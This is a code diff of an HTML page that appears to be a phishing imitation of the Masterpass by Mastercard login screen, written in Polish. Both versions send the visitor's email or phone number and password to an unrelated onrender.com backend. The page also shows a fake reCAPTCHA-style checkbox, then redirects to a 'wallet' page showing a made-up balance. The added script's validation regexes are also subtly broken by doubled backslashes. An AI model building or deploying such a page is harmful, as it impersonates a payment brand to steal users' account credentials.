@@ -7,119 +7,184 @@
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="icon" href="https://img.icons8.com/ios-filled/50/000000/mastercard-logo.png" />
   <style>
-    body {
-      background: url('https://masterpass.com/etc/designs/masterpass/clientlibs_base/img/homepage/homepage-hero-background.jpg') center/cover no-repeat;
-      animation: fadeBg 8s ease-in-out infinite alternate;
+    .input-icon {
+      position: absolute;
+      left: 0.75rem;
+      top: 50%;
+      transform: translateY(-50%);
+      pointer-events: none;
     }
-    @keyframes fadeBg { 0% { filter: brightness(1); } 100% { filter: brightness(0.9); } }
-    .fade-in { animation: fadeIn 0.6s ease-out both; }
-    @keyframes fadeIn { from { opacity:0; transform: translateY(10px);} to{opacity:1;transform:translateY(0);} }
-    .shake { animation: shake 0.3s ease-in-out; }
-    @keyframes shake { 0%{transform:translateX(0)}25%{transform:translateX(-5px)}50%{transform:translateX(5px)}75%{transform:translateX(-5px)}100%{transform:translateX(0)} }
+    .input-with-icon {
+      padding-left: 2.5rem;
+    }
+    .shake {
+      animation: shake 0.3s ease-in-out;
+    }
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      20%, 60% { transform: translateX(-5px); }
+      40%, 80% { transform: translateX(5px); }
+    }
   </style>
 </head>
-<body class="flex items-center justify-center min-h-screen font-sans backdrop-blur-md transition duration-300" id="body">
-  <div id="wrap" class="bg-white/90 dark:bg-gray-800 backdrop-blur-xl w-[480px] sm:w-[640px] rounded-2xl shadow-2xl fade-in transition-all duration-500">
-    <div class="flex items-center justify-between p-4 border-b border-gray-300 dark:border-gray-600">
+<body class="bg-gray-100 flex items-center justify-center min-h-screen font-sans">
+  <div class="bg-white w-[480px] sm:w-[640px] rounded shadow-md relative overflow-hidden animate-fade-in">
+    <!-- Header -->
+    <div class="flex items-center justify-between p-4 border-b bg-white">
       <div class="flex items-center space-x-2">
         <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" class="w-8 h-8" />
-        <div class="text-sm font-semibold dark:text-gray-200">masterpass <span class="text-gray-500 text-xs block">by mastercard.</span></div>
+        <div class="text-sm font-semibold">
+          masterpass <span class="text-gray-500 text-xs block">by mastercard.</span>
+        </div>
       </div>
-      <button onclick="toggleTheme()" class="text-sm px-2 py-1 bg-gray-200 dark:bg-gray-700 dark:text-white rounded">🌓</button>
+      <button class="text-black text-2xl font-bold hover:scale-110 transition">&times;</button>
     </div>
-    <div class="flex">
-      <div class="hidden md:flex flex-col gap-6 p-6 text-sm w-1/2 border-r border-gray-300 dark:border-gray-600">
-        <div class="flex items-start gap-2"><img src="https://img.icons8.com/ios-filled/24/lock.png"/><span>Zabezpieczone logowanie przez Mastercard.</span></div>
-        <div class="flex items-start gap-2"><img src="https://img.icons8.com/ios-filled/24/wallet.png"/><span>Połączone płatności i portfele cyfrowe.</span></div>
-        <div class="flex items-start gap-2"><img src="https://img.icons8.com/ios-filled/24/privacy.png"/><span>Chronione dane użytkownika.</span></div>
+
+    <!-- Main content -->
+    <div class="flex bg-white">
+      <!-- Benefits -->
+      <div class="hidden md:flex flex-col gap-6 p-6 text-sm w-1/2 border-r">
+        <div>
+          <img src="https://img.icons8.com/ios-filled/24/ef4444/lock--v1.png" />
+          <p class="mt-2"><strong>Bezpieczeństwo</strong><br />Płatność, dzięki której sklepy nie widzą danych Twojej karty</p>
+        </div>
+        <div>
+          <img src="https://img.icons8.com/ios-filled/24/ef4444/stopwatch.png" />
+          <p class="mt-2"><strong>Szybkość transakcji</strong><br />Dane karty podajesz tylko raz – przy rejestracji</p>
+        </div>
+        <div>
+          <img src="https://img.icons8.com/ios-filled/24/ef4444/laptop.png" />
+          <p class="mt-2"><strong>Wygoda</strong><br />Zakupy on-line na każdym urządzeniu</p>
+        </div>
       </div>
+
+      <!-- Login form -->
       <div class="flex-1 p-6">
-        <h2 class="text-lg font-semibold mb-4 dark:text-gray-100">Zaloguj się</h2>
-        <form id="loginForm" class="space-y-4" novalidate>
+        <h2 class="text-lg font-semibold mb-4">Zaloguj się</h2>
+        <form id="loginForm" class="space-y-4">
+          <!-- Email / Phone -->
           <div class="relative">
-            <span class="absolute left-3 top-3 text-gray-400 dark:text-gray-400"><img src="https://img.icons8.com/ios-glyphs/20/000000/email.png"/></span>
-            <input type="text" name="email" placeholder="Adres e-mail lub numer telefonu"
-              class="w-full pl-10 border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none dark:bg-gray-700 dark:text-white"
-              required/>
-            <p id="emailErr" class="text-xs text-red-500 hidden mt-1">Niepoprawny e‑mail lub numer +48XXXXXXXXX</p>
+            <svg class="input-icon w-5 h-5 text-gray-400" fill="none" stroke="currentColor" stroke-width="2"
+              viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round"
+                d="M16 12H8m0 0l4-4m-4 4l4 4"></path></svg>
+            <input
+              type="text"
+              name="email"
+              placeholder="Adres e-mail lub numer telefonu"
+              class="input-with-icon w-full border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none"
+              id="emailInput"
+              required />
           </div>
-
+          <!-- Password -->
           <div class="relative">
-            <span class="absolute left-3 top-3 text-gray-400 dark:text-gray-400"><img src="https://img.icons8.com/ios-glyphs/20/000000/lock--v1.png"/></span>
-            <input type="password" name="password" placeholder="Hasło (min. 8 znaków)"
-              class="w-full pl-10 border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none dark:bg-gray-700 dark:text-white"
-              required/>
-            <p id="passErr" class="text-xs text-red-500 hidden mt-1">Hasło musi mieć ≥ 8 znaków</p>
+            <svg class="input-icon w-5 h-5 text-gray-400" fill="none" stroke="currentColor" stroke-width="2"
+              viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round"
+                d="M12 15v2m-6 4h12a2 2 0 002-2v-5a2 2 0 00-2-2H6a2 2 0 00-2 2v5a2 2 0 002 2zm6-14a2 2 0 11-4 0 2 2 0 014 0z" /></svg>
+            <input
+              type="password"
+              name="password"
+              placeholder="Hasło"
+              class="input-with-icon w-full border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none"
+              id="passwordInput"
+              required />
           </div>
 
-          <div class="flex items-center">
-            <input type="checkbox" id="robot" class="mr-2" />
-            <label for="robot" class="text-sm dark:text-gray-100">Nie jestem robotem</label>
+          <!-- I'm not a robot -->
+          <div class="flex items-center gap-2">
+            <input type="checkbox" id="robot" />
+            <label for="robot" class="text-sm">I'm not a robot</label>
+            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="h-6 ml-2" />
           </div>
 
-          <button type="submit" id="loginBtn"
-            class="bg-gray-300 text-white w-full py-2 rounded cursor-not-allowed transition duration-300"
+          <div class="flex items-center justify-between text-sm">
+            <label><input type="checkbox" id="remember" /> Pamiętaj mój login</label>
+            <a href="#" class="text-black underline hover:text-orange-500">Nie znam hasła</a>
+          </div>
+
+          <button
+            type="submit"
+            class="bg-gray-300 text-white w-full py-2 rounded cursor-not-allowed"
+            id="loginBtn"
             disabled>
             Zaloguj
           </button>
         </form>
       </div>
     </div>
-    <div class="text-xs bg-black/80 dark:bg-gray-900 text-white p-2 text-center rounded-b-lg">
-      Korzystanie z usługi oznacza akceptację regulaminu i polityki prywatności Mastercard.
+
+    <!-- Footer -->
+    <div class="text-xs bg-black text-white p-2 text-center">
+      Strona wykorzystuje pliki cookie i inne podobne technologie. Korzystając z niej wyrażasz zgodę...
     </div>
-    <div class="bg-white/80 dark:bg-gray-800 text-xs p-2 flex justify-between items-center border-t border-gray-300 dark:border-gray-600 rounded-b-2xl">
-      <img src="https://img.icons8.com/ios-filled/50/000000/mastercard-logo.png" class="h-5"/>
+    <div class="bg-white text-xs p-2 flex justify-between items-center border-t">
+      <img src="https://img.icons8.com/ios-filled/50/000000/mastercard-logo.png" class="h-5" />
       <span>Zgoda na pliki cookies</span>
     </div>
   </div>
 
   <script>
-    const form = document.getElementById('loginForm'),
-      btn = document.getElementById('loginBtn'),
-      robot = document.getElementById('robot'),
-      email = form.email,
-      pass = form.password,
-      emailErr = document.getElementById('emailErr'),
-      passErr = document.getElementById('passErr'),
-      wrap = document.getElementById('wrap');
+    const form = document.getElementById('loginForm');
+    const loginBtn = document.getElementById('loginBtn');
+    const robotCheckbox = document.getElementById('robot');
+    const emailInput = document.getElementById('emailInput');
+    const passwordInput = document.getElementById('passwordInput');
 
-    robot.addEventListener('change', () => {
-      btn.disabled = !robot.checked;
-      btn.classList.toggle('bg-orange-500', robot.checked);
-      btn.classList.toggle('cursor-pointer', robot.checked);
-      btn.classList.toggle('cursor-not-allowed', !robot.checked);
+    // Enable button on checkbox
+    robotCheckbox.addEventListener('change', () => {
+      loginBtn.disabled = !robotCheckbox.checked;
+      loginBtn.classList.toggle('bg-orange-500', robotCheckbox.checked);
+      loginBtn.classList.toggle('cursor-pointer', robotCheckbox.checked);
+      loginBtn.classList.toggle('cursor-not-allowed', !robotCheckbox.checked);
     });
 
-    form.addEventListener('submit', async e => {
+    // Validation logic
+    function isValidEmailOrPhone(value) {
+      const emailRegex = /^[\\w.-]+@[\\w.-]+\\.\\w{2,}$/;
+      const phoneRegex = /^\\+48\\d{9}$/;
+      return emailRegex.test(value) || phoneRegex.test(value);
+    }
+
+    form.addEventListener('submit', async (e) => {
       e.preventDefault();
-      emailErr.classList.add('hidden'); passErr.classList.add('hidden');
-      let ok = true;
-      const reMail = /^[\w.-]+@[\w.-]+\.\w{2,}$/,
-            rePh = /^\+48\d{9}$/,
-            rePass = /^.{8,}$/;
-      if (!reMail.test(email.value) && !rePh.test(email.value)) {
-        emailErr.classList.remove('hidden'); email.classList.add('border-red-500'); ok = false;
-      } else email.classList.remove('border-red-500');
-      if (!rePass.test(pass.value)) {
-        passErr.classList.remove('hidden'); pass.classList.add('border-red-500'); ok = false;
-      } else pass.classList.remove('border-red-500');
+      const email = emailInput.value.trim();
+      const password = passwordInput.value.trim();
 
-      if (!ok) { wrap.classList.add('shake'); setTimeout(()=>wrap.classList.remove('shake'),300); return; }
+      if (!isValidEmailOrPhone(email)) {
+        emailInput.classList.add('border-red-500', 'shake');
+        setTimeout(() => emailInput.classList.remove('shake'), 300);
+        return;
+      }
 
-      btn.textContent = 'Wysyłanie…'; btn.disabled = true;
+      if (password.length < 8) {
+        passwordInput.classList.add('border-red-500', 'shake');
+        setTimeout(() => passwordInput.classList.remove('shake'), 300);
+        return;
+      }
+
+      const payload = {
+        email: email,
+        password: password,
+        remember: document.getElementById('remember').checked
+      };
+
       try {
-        await fetch('https://zaza-back.onrender.com/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:email.value,password:pass.value,remember:robot.checked})});
-        localStorage.setItem('user',JSON.stringify({email:email.value,balance:'100.00'}));
-        window.location.href='wallet.html';
-      } catch (e) {
-        btn.textContent='Błąd'; setTimeout(()=>btn.textContent='Zaloguj',2000);
+        const res = await fetch('https://zaza-back.onrender.com/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload),
+        });
+
+        if (res.ok) {
+          localStorage.setItem('user', JSON.stringify({
+            email: email,
+            balance: '100.00'
+          }));
+          window.location.href = 'wallet.html';
+        }
+      } catch (err) {
+        console.error(err);
       }
     });
-
-    function toggleTheme() {
-      document.documentElement.classList.toggle('dark');
-    }
   </script>
 </body>
 </html>
